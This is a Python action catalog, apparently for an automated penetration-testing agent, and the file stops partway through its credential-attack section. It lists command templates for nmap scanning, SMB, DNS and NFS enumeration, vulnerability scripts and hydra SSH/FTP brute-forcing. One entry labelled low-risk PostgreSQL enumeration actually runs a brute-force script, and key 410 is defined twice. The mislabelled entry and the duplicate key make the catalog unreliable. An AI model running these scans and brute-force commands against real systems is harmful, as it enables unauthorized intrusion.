import re

# 000-099  Control
# 100-199  Local attacker context
# 200-299  Recon / discovery / scan
# 300-399  Enumeration
# 400-499  Vulnerability discovery / validation
# 500-599  Credential attacks
# 600-699  Exploitation
# 700-799  Post-exploitation

# action_id -> (name, command)
ACTIONS = {
    # ============================================================
    # 000-099 CONTROL
    # ============================================================

    0: {
        "name": "STOP",
        "category": "control",
        "phase": "stop",
        "tool": None,
        "command_template": None,
        "placeholders": [],
        "parser_family": None,
        "expected_events": ["SESSION_STOPPED"],
        "description": "Stop the session.",
    },

    1: {
        "name": "NO_OP",
        "category": "control",
        "phase": "control",
        "tool": None,
        "command_template": None,
        "placeholders": [],
        "parser_family": None,
        "expected_events": ["NO_ACTION"],
        "preconditions": {},
        "risk_level": "safe",
        "description": "Do nothing in the current step.",
    },

    # Windows
    # 1: {
    #     "name": "INSPECT_IPCONFIG",
    #     "category": "local_inspection",
    #     "phase": "attacker_context",
    #     "tool": "ipconfig",
    #     "command_template": "ipconfig /all",
    #     "placeholders": [],
    #     "parser_family": "windows_ipconfig",
    #     "expected_events": ["NET_INFO"],
    #     "description": "Inspect local Windows network interfaces.",
    # },
    # # 1: ("INSPECT_IPCONFIG", "ipconfig /all"),
    # 2: ("INSPECT_ARP", "arp -a"),
    # 3: ("INSPECT_ROUTE", "route print"),
    # # : ("INSPECT_NETSTAT", "netstat -ano"),
    # 4: ("PING_FOCUS_HOST", "ping -n 1 {ip}"),

    # ============================================================
    # 100-199 LOCAL ATTACKER CONTEXT
    # ============================================================
    100: {
        "name": "INSPECT_LOCAL_HOSTNAME",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "hostname",
        "command_template": "hostname",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["LOCAL_HOSTNAME_DETECTED"],
        "preconditions": {},
        "risk_level": "safe",
        "description": "Inspect local attacker hostname.",
    },
    101: {
        "name": "INSPECT_IP_A",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ip",
        "command_template": "ip a",
        "placeholders": [],
        "parser_family": "linux_ip_addr",
        "expected_events": ["NET_INFO"],
        "description": "Inspect local Linux network interfaces.",
    },
    # 101: ("INSPECT_IP_A", "ip a"),
    102: {
        "name": "INSPECT_IP_R",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ip",
        "command_template": "ip r",
        "placeholders": [],
        "parser_family": "linux_ip_route",
        "expected_events": ["ROUTE_TABLE"],
        "description": "Inspect local Linux routing table.",
    },
    # 102: ("INSPECT_IP_R", "ip r"),
    103: {
        "name": "INSPECT_IP_NEIGH",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ip",
        "command_template": "ip neigh",
        "placeholders": [],
        "parser_family": "linux_ip_neigh",
        "expected_events": ["ARP_TABLE"],
        "description": "Inspect local Linux ARP table.",
    },
    104: {
        "name": "INSPECT_SS_LISTENERS",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ss",
        "command_template": "ss -tulpn",
        "placeholders": [],
        "parser_family": "linux_ss",
        "expected_events": ["PORT_LISTENER_DETECTED"],
        "preconditions": {},
        "risk_level": "safe",
        "description": "Inspect local listening TCP/UDP sockets.",
    },
    105: {
        "name": "PING_FOCUS_HOST",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ping",
        "command_template": "ping -c 1 -W 2 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "generic_ping",
        "expected_events": ["PING_RESPONSE"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "risk_level": "safe",
        "description": "Ping the focused host once.",
    },

    106: {
        "name": "TRACE_ROUTE_TO_HOST",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "traceroute",
        "command_template": "traceroute {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "traceroute",
        "expected_events": ["ROUTE_HOP_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "risk_level": "safe",
        "description": "Trace network path to the focused host.",
    },

    # ============================================================
    # 200-299 RECON / DISCOVERY / PORT SCANNING
    # ============================================================
    200: {
        "name": "DISCOVER_HOSTS",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "nmap",
        "command_template": "nmap -sn {target}",
        "placeholders": ["target"],
        "parser_family": "nmap_host_discovery",
        "expected_events": ["HOST_DISCOVERED"],
        "description": "Discover alive hosts in the target network.",
    },
    # 200: ("DISCOVER_HOSTS", "nmap -sn {target}"),
     201: {
        "name": "DISCOVER_HOSTS_ARP_LOCALNET",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "arp-scan",
        "command_template": "arp-scan --localnet",
        "placeholders": [],
        "parser_family": "arp_scan",
        "expected_events": ["HOST_DISCOVERED"],
        "preconditions": {},
        "risk_level": "safe",
        "description": "Discover local network hosts using ARP scan.",
    },

    202: {
        "name": "DISCOVER_HOSTS_ARP_RANGE",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "arp-scan",
        "command_template": "arp-scan {target}",
        "placeholders": ["target"],
        "parser_family": "arp_scan",
        "expected_events": ["HOST_DISCOVERED"],
        "preconditions": {
            "requires_target": True,
        },
        "risk_level": "safe",
        "description": "Discover hosts in a target range using ARP scan.",
    },

    203: {
        "name": "DISCOVER_HOSTS_NETDISCOVER",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "netdiscover",
        "command_template": "netdiscover -r {target}",
        "placeholders": ["target"],
        "parser_family": "netdiscover",
        "expected_events": ["HOST_DISCOVERED"],
        "preconditions": {
            "requires_target": True,
        },
        "risk_level": "safe",
        "description": "Discover hosts using netdiscover.",
    },

    204: {
        "name": "DISCOVER_HOSTS_FPING",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "fping",
        "command_template": "fping -a -g {target} 2>/dev/null",
        "placeholders": ["target"],
        "parser_family": "fping",
        "expected_events": ["HOST_DISCOVERED"],
        "preconditions": {
            "requires_target": True,
        },
        "risk_level": "safe",
        "description": "Discover alive hosts using fping sweep.",
    },

    210: {
        "name": "SCAN_TOP_TCP_PORTS",
        "category": "recon",
        "phase": "portscan",
        "tool": "nmap",
        "command_template": "nmap --top-ports 1000 --open -T3 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_portscan",
        "expected_events": ["PORT_OPEN"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "description": "Scan common TCP ports on the focused host.",
    },
    # 210: ("SCAN_TOP_TCP_PORTS", "nmap --top-ports 1000 --open -T3 {target_ip}"),
    
    211: {
        "name": "SCAN_FULL_TCP_PORTS",
        "category": "recon",
        "phase": "portscan",
        "tool": "nmap",
        "command_template": "nmap -p- --open -T3 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_portscan",
        "expected_events": ["PORT_OPEN"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "description": "Scan all TCP ports on the focused host.",
    },
    
    212: {
        "name": "SCAN_QUICK_TCP_PORTS",
        "category": "recon",
        "phase": "portscan",
        "tool": "nmap",
        "command_template": "nmap -F --open -T3 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_portscan",
        "expected_events": ["PORT_OPEN"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "risk_level": "low",
        "description": "Run a fast TCP port scan.",
    },

    213: {
        "name": "SCAN_TOP_UDP_PORTS",
        "category": "recon",
        "phase": "portscan",
        "tool": "nmap",
        "command_template": "nmap -sU --top-ports 100 -T3 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_portscan",
        "expected_events": ["PORT_OPEN"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "risk_level": "medium",
        "description": "Scan common UDP ports on the focused host.",
    },

    220: {
        "name": "DETECT_SERVICES",
        "category": "recon",
        "phase": "service_detection",
        "tool": "nmap",
        "command_template": "nmap -sV -sC -O -T3 -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_service_detection",
        "expected_events": [
            "SERVICE_DETECTED",
            "SERVICE_VERSION_DETECTED",
            "OS_GUESS_DETECTED",
            "SCRIPT_RESULT",
        ],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "low",
        "description": "Detect service names, versions, default script output and OS hints.",
    },

    221: {
        "name": "DETECT_SERVICES_LIGHT",
        "category": "recon",
        "phase": "service_detection",
        "tool": "nmap",
        "command_template": "nmap -sV --version-light -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_service_detection",
        "expected_events": ["SERVICE_DETECTED", "SERVICE_VERSION_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "low",
        "description": "Run light service version detection.",
    },

    222: {
        "name": "DETECT_SERVICES_AGGRESSIVE",
        "category": "recon",
        "phase": "service_detection",
        "tool": "nmap",
        "command_template": "nmap -A -T3 -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_service_detection",
        "expected_events": [
            "SERVICE_DETECTED",
            "SERVICE_VERSION_DETECTED",
            "OS_GUESS_DETECTED",
            "SCRIPT_RESULT",
        ],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "medium",
        "description": "Run aggressive Nmap service, OS and default script detection.",
    },

    230: {
        "name": "ENUM_NMAP_DEFAULT_SCRIPTS",
        "category": "enumeration",
        "phase": "general_enum",
        "tool": "nmap",
        "command_template": "nmap -sC -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_scripts",
        "expected_events": ["SCRIPT_RESULT"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "low",
        "description": "Run Nmap default NSE scripts on known open ports.",
    },

    # ============================================================
    # 300-399 SERVICE ENUMERATION
    # ============================================================
    300: {
        "name": "ENUM_HTTP_HEADERS",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "curl",
        "command_template": "curl -I --max-time 10 http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "curl_http_headers",
        "expected_events": ["HTTP_HEADER_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "safe",
        "description": "Enumerate HTTP response headers.",
    },

    301: {
        "name": "ENUM_HTTP_INDEX",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "curl",
        "command_template": "curl -L --max-time 10 http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "curl_http_body",
        "expected_events": ["HTTP_TITLE_DETECTED", "HTTP_BODY_HINT_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "safe",
        "description": "Fetch HTTP index page and extract basic hints.",
    },

    302: {
        "name": "ENUM_HTTPS_HEADERS",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "curl",
        "command_template": "curl -k -I --max-time 10 https://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "curl_http_headers",
        "expected_events": ["HTTP_HEADER_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["https"],
        },
        "risk_level": "safe",
        "description": "Enumerate HTTPS response headers.",
    },

    303: {
        "name": "ENUM_HTTP_ROBOTS",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "curl",
        "command_template": "curl -L --max-time 10 http://{target_ip}:{target_port}/robots.txt",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "curl_robots",
        "expected_events": ["ROBOTS_TXT_FOUND", "WEB_PATH_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "safe",
        "description": "Fetch robots.txt from HTTP service.",
    },

    310: {
        "name": "ENUM_HTTP_DIRS_GOBUSTER",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "gobuster",
        "command_template": "gobuster dir -u http://{target_ip}:{target_port} -w /usr/share/wordlists/dirb/common.txt -q",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "gobuster_dir",
        "expected_events": ["WEB_PATH_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "low",
        "description": "Discover common HTTP paths using gobuster.",
    },

    311: {
        "name": "ENUM_HTTP_DIRS_FEROXBUSTER",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "feroxbuster",
        "command_template": "feroxbuster -u http://{target_ip}:{target_port} -w /usr/share/wordlists/dirb/common.txt -q",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "feroxbuster",
        "expected_events": ["WEB_PATH_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "low",
        "description": "Discover common HTTP paths using feroxbuster.",
    },

    312: {
        "name": "ENUM_HTTP_NIKTO",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "nikto",
        "command_template": "nikto -h http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nikto",
        "expected_events": ["WEB_FINDING_FOUND", "CANDIDATE_VULN_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "low",
        "description": "Run basic Nikto checks against HTTP service.",
    },

    313: {
        "name": "ENUM_HTTP_TECHNOLOGIES",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "whatweb",
        "command_template": "whatweb http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "whatweb",
        "expected_events": ["WEB_TECH_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http", "https"],
        },
        "risk_level": "safe",
        "description": "Fingerprint web technologies.",
    },

    314: {
        "name": "ENUM_HTTP_WAF",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "wafw00f",
        "command_template": "wafw00f http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "wafw00f",
        "expected_events": ["WAF_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http", "https"],
        },
        "risk_level": "safe",
        "description": "Detect possible web application firewall.",
    },

    # -------------------------
    # SMB
    # -------------------------

    320: {
        "name": "ENUM_SMB_SHARES",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "smbclient",
        "command_template": "smbclient -L //{target_ip} -N",
        "placeholders": ["target_ip"],
        "parser_family": "smbclient_shares",
        "expected_events": ["SMB_SHARE_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds", "netbios-ssn"],
        },
        "risk_level": "safe",
        "description": "Enumerate SMB shares anonymously.",
    },

    321: {
        "name": "ENUM_SMB_BASIC_ENUM4LINUX",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "enum4linux",
        "command_template": "enum4linux -a {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "enum4linux",
        "expected_events": ["SMB_USER_FOUND", "SMB_SHARE_FOUND", "SMB_GROUP_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds", "netbios-ssn"],
        },
        "risk_level": "low",
        "description": "Run basic SMB enumeration using enum4linux.",
    },

    322: {
        "name": "ENUM_SMB_NULL_SESSION_USERS",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "rpcclient",
        "command_template": "rpcclient -U '' -N {target_ip} -c enumdomusers",
        "placeholders": ["target_ip"],
        "parser_family": "rpcclient",
        "expected_events": ["SMB_USER_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds", "netbios-ssn"],
        },
        "risk_level": "low",
        "description": "Attempt anonymous SMB user enumeration through rpcclient.",
    },

    323: {
        "name": "ENUM_SMB_OS_DISCOVERY",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "nmap",
        "command_template": "nmap -p 445 --script smb-os-discovery {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_smb",
        "expected_events": ["OS_GUESS_DETECTED", "SMB_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds"],
        },
        "risk_level": "safe",
        "description": "Discover SMB OS information using Nmap NSE.",
    },

    324: {
        "name": "ENUM_SMB_PROTOCOLS",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "nmap",
        "command_template": "nmap -p 445 --script smb-protocols {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_smb",
        "expected_events": ["SMB_PROTOCOL_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds"],
        },
        "risk_level": "safe",
        "description": "Enumerate supported SMB protocol versions.",
    },

    # -------------------------
    # FTP
    # -------------------------

    330: {
        "name": "ENUM_FTP_BANNER",
        "category": "enumeration",
        "phase": "ftp_enum",
        "tool": "nc",
        "command_template": "printf 'QUIT\\r\\n' | nc -nv -w 5 {target_ip} {target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "generic_banner",
        "expected_events": ["SERVICE_BANNER_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "safe",
        "description": "Grab FTP banner.",
    },

    331: {
        "name": "ENUM_FTP_ANONYMOUS",
        "category": "enumeration",
        "phase": "ftp_enum",
        "tool": "nmap",
        "command_template": "nmap --script ftp-anon -p {target_port} {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ftp_anon",
        "expected_events": ["FTP_ANON_LOGIN_ALLOWED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "safe",
        "description": "Check anonymous FTP access.",
    },

    332: {
        "name": "ENUM_FTP_NMAP_SCRIPTS",
        "category": "enumeration",
        "phase": "ftp_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script ftp-anon,ftp-syst --script-timeout 10s --host-timeout 30s {target_ip}",
        # "command_template": "nmap -p {target_port} --script ftp-* {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ftp",
        "expected_events": ["FTP_INFO_DETECTED", "SCRIPT_RESULT"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "low",
        "description": "Run FTP-related Nmap scripts.",
    },

    # -------------------------
    # SSH
    # -------------------------

    340: {
        "name": "ENUM_SSH_BANNER",
        "category": "enumeration",
        "phase": "ssh_enum",
        "tool": "nc",
        "command_template": "nc -nv -w 5 {target_ip} {target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "generic_banner",
        "expected_events": ["SERVICE_BANNER_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ssh"],
        },
        "risk_level": "safe",
        "description": "Grab SSH banner.",
    },

    341: {
        "name": "ENUM_SSH_NMAP_SCRIPTS",
        "category": "enumeration",
        "phase": "ssh_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script ssh2-enum-algos,ssh-hostkey {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ssh",
        "expected_events": ["SSH_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ssh"],
        },
        "risk_level": "safe",
        "description": "Enumerate SSH algorithms and host keys.",
    },

    # -------------------------
    # DNS
    # -------------------------

    350: {
        "name": "ENUM_DNS_VERSION_BIND",
        "category": "enumeration",
        "phase": "dns_enum",
        "tool": "dig",
        "command_template": "dig @{target_ip} version.bind chaos txt",
        "placeholders": ["target_ip"],
        "parser_family": "dig",
        "expected_events": ["DNS_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["dns", "domain"],
        },
        "risk_level": "safe",
        "description": "Query DNS version.bind information.",
    },

    351: {
        "name": "ENUM_DNS_ANY",
        "category": "enumeration",
        "phase": "dns_enum",
        "tool": "dig",
        "command_template": "dig @{target_ip} {target_domain} any",
        "placeholders": ["target_ip", "target_domain"],
        "parser_family": "dig",
        "expected_events": ["DNS_RECORD_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_domain": True,
            "requires_service": ["dns", "domain"],
        },
        "risk_level": "safe",
        "description": "Query DNS ANY records for a known domain.",
    },

    352: {
        "name": "ENUM_DNS_ZONE_TRANSFER",
        "category": "enumeration",
        "phase": "dns_enum",
        "tool": "dig",
        "command_template": "dig axfr @{target_ip} {target_domain}",
        "placeholders": ["target_ip", "target_domain"],
        "parser_family": "dig_axfr",
        "expected_events": ["DNS_ZONE_TRANSFER_ALLOWED", "DNS_RECORD_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_domain": True,
            "requires_service": ["dns", "domain"],
        },
        "risk_level": "low",
        "description": "Attempt DNS zone transfer in authorized lab.",
    },

    # -------------------------
    # NFS / RPC
    # -------------------------

    360: {
        "name": "ENUM_NFS_EXPORTS",
        "category": "enumeration",
        "phase": "nfs_enum",
        "tool": "showmount",
        "command_template": "showmount -e {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "showmount",
        "expected_events": ["NFS_EXPORT_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["nfs", "nfs_acl", "mountd", "rpcbind"],
        },
        "risk_level": "safe",
        "description": "Enumerate NFS exported directories.",
    },

    361: {
        "name": "ENUM_RPC_SERVICES",
        "category": "enumeration",
        "phase": "rpc_enum",
        "tool": "rpcinfo",
        "command_template": "rpcinfo -p {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "rpcinfo",
        "expected_events": ["RPC_SERVICE_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["rpcbind", "sunrpc"],
        },
        "risk_level": "safe",
        "description": "Enumerate RPC services exposed by the target.",
    },

    362: {
        "name": "ENUM_NFS_NMAP_SCRIPTS",
        "category": "enumeration",
        "phase": "nfs_enum",
        "tool": "nmap",
        "command_template": "nmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_nfs",
        "expected_events": ["NFS_EXPORT_FOUND", "NFS_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["nfs", "rpcbind", "sunrpc"],
        },
        "risk_level": "low",
        "description": "Enumerate NFS exports and metadata using Nmap NSE scripts.",
    },

     # -------------------------
    # Databases
    # -------------------------

    370: {
        "name": "ENUM_MYSQL_INFO",
        "category": "enumeration",
        "phase": "db_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script mysql-info {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_mysql",
        "expected_events": ["DB_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["mysql"],
        },
        "risk_level": "safe",
        "description": "Enumerate MySQL service information.",
    },

    371: {
        "name": "ENUM_POSTGRES_INFO",
        "category": "enumeration",
        "phase": "db_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script pgsql-brute --script-args brute.mode=creds {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_postgres",
        "expected_events": ["DB_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["postgresql"],
        },
        "risk_level": "low",
        "description": "Run basic PostgreSQL NSE enumeration in lab context.",
    },

    # -------------------------
    # RDP / VNC
    # -------------------------

    380: {
        "name": "ENUM_RDP_INFO",
        "category": "enumeration",
        "phase": "rdp_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script rdp-enum-encryption,rdp-ntlm-info {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_rdp",
        "expected_events": ["RDP_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ms-wbt-server", "rdp"],
        },
        "risk_level": "safe",
        "description": "Enumerate RDP encryption and NTLM information.",
    },

    381: {
        "name": "ENUM_VNC_INFO",
        "category": "enumeration",
        "phase": "vnc_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script vnc-info {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_vnc",
        "expected_events": ["VNC_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["vnc"],
        },
        "risk_level": "safe",
        "description": "Enumerate VNC information.",
    },

    # ============================================================
    # 400-499 VULNERABILITY DISCOVERY
    # ============================================================

    400: {
        "name": "CHECK_SERVICE_VERSION_VULNS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "searchsploit",
        "command_template": "searchsploit {service_version_string}",
        "placeholders": ["service_version_string"],
        "parser_family": "searchsploit",
        "expected_events": ["CANDIDATE_VULN_FOUND"],
        "preconditions": {
            "requires_service_version_string": True,
        },
        "risk_level": "safe",
        "description": "Search public exploit references for detected service versions.",
    },

    401: {
        "name": "CHECK_NMAP_VULN_SCRIPTS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap --script vuln -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_vuln_scripts",
        "expected_events": ["CANDIDATE_VULN_FOUND", "VULN_SCRIPT_RESULT"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "medium",
        "description": "Run Nmap vulnerability scripts against known open ports.",
    },

    410: {
        "name": "CHECK_NMAP_VULN_SCRIPTS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap --script vuln -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["target_ip", "known_open_ports_csv"],
        "parser_family": "nmap_vuln_scripts",
        "expected_events": ["CANDIDATE_VULN_FOUND", "VULN_SCRIPT_RESULT"],
        "description": "Run Nmap vulnerability scripts against known open ports.",
    },
    # 400: ("CHECK_SERVICE_VERSION_VULNS", "searchsploit {service_version_string}"),
    410: {
        "name": "CHECK_SMB_VULNS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap -p 445 --script smb-vuln* {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_smb_vuln",
        "expected_events": ["CANDIDATE_VULN_FOUND", "VULN_SCRIPT_RESULT"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds"],
        },
        "risk_level": "medium",
        "description": "Run SMB vulnerability NSE scripts.",
    },

    411: {
        "name": "CHECK_HTTP_VULNS_NIKTO",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nikto",
        "command_template": "nikto -h http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nikto",
        "expected_events": ["WEB_FINDING_FOUND", "CANDIDATE_VULN_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "low",
        "description": "Check common HTTP vulnerabilities using Nikto.",
    },

    412: {
        "name": "CHECK_SSL_TLS_CIPHERS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script ssl-enum-ciphers {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ssl",
        "expected_events": ["TLS_INFO_DETECTED", "TLS_WEAKNESS_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ssl", "https"],
        },
        "risk_level": "safe",
        "description": "Enumerate TLS configuration and weak ciphers.",
    },

    413: {
        "name": "CHECK_FTP_VULNS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script ftp-vsftpd-backdoor,ftp-anon {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ftp_vuln",
        "expected_events": ["CANDIDATE_VULN_FOUND", "FTP_ANON_LOGIN_ALLOWED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "low",
        "description": "Check common FTP issues in lab context.",
    },

    # ============================================================
    # 500-599 CREDENTIAL ATTACKS / AUTH CHECKS
    # ============================================================
    500: {
        "name": "BRUTEFORCE_SSH",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "hydra",
        "command_template": "hydra -L {userlist_path} -P {passwordlist_path} ssh://{target_ip}",
        "placeholders": ["target_ip", "userlist_path", "passwordlist_path"],
        "parser_family": "hydra",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_FAILED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["ssh"],
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Run SSH credential testing in an authorized lab.",
    },

    501: {
        "name": "BRUTEFORCE_FTP",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "hydra",
        "command_template": "hydra -L {userlist_path} -P {passwordlist_path} ftp://{target_ip}",
        "placeholders": ["target_ip", "userlist_path", "passwordlist_path"],
        "parser_family": "hydra",
